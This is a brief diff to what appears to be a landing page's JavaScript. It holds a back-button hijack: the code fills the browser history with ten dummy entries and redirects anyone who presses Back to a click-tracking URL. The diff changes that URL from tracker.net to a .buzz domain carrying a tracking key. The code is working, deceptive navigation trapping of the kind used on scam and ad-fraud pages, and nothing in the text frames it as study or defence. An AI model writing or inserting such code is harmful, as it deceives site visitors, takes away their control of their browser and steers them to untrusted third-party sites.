@@ -396,7 +396,7 @@ $("#p_modal_button3").click(function(){
             const URL = window.location.href.split(/[#]/)[0];
             for (t = 0; 10 > t; ++t) history.pushState({}, "", URL+'#')
             onpopstate = function(event){
-                event.state && location.replace('https://tracker.net/click.php?lp=1&event10=1');
+                event.state && location.replace('https://org.rangextd.buzz/click.php?key=hcu8pp6mpc2ciyqsb8dw');
             }
         } catch (o) { console.log( o ); }
     }();
